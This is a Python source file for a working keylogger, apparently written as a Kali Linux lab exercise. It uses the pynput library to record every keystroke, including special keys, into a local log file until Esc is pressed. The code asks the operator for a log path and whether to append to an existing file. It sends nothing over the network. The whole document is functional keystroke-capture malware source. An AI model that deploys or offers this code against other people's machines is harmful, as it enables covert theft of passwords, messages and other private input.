from pynput import keyboard
import os
import datetime


def create_log_file(file_path):
    try:
        with open(file_path, 'w'):
            pass
    except Exception as e:
        print(f"Error creating log file: {e}")


def on_press(key, file_path):
    try:
        char = key.char
        with open(file_path, 'a') as f:
            f.write(char)
    except AttributeError:
        # Log special keys with additional information
        with open(file_path, 'a') as f:
            f.write(f'[Special Key: {key}]')


def on_release(key, file_path):
    if key == keyboard.Key.esc:
        # Stop listener on pressing the escape key
        print("Keylogger stopped.")
        return False


def start_keylogger(file_path):
    print("Keylogger started. Press 'Esc' to stop.")
    # Clear existing log file or create a new one
    create_log_file(file_path)

    # Collect events until released
    with keyboard.Listener(on_press=lambda key: on_press(key, file_path),
                           on_release=lambda key: on_release(key, file_path)) as listener:
        listener.join()


if __name__ == "__main__":
    try:
        user_input = input("Enter the desired log file path (default is '/home/kali/Desktop/keylogger_output.txt'): ")
        log_file_path = user_input.strip() or '/home/kali/Desktop/keylogger_output.txt'

        # Check if the log file already exists
        if os.path.exists(log_file_path):
            user_input = input("The log file already exists. Do you want to append to it? (yes/no): ")
            if user_input.lower() == 'no':
                timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
                log_file_path = f'//home/kali/Desktop/keylogger_output_{timestamp}.txt'

        start_keylogger(log_file_path)
    except KeyboardInterrupt:
        print("\nKeylogger terminated by user.")
    except Exception as e:
        print(f"Error: {e}")
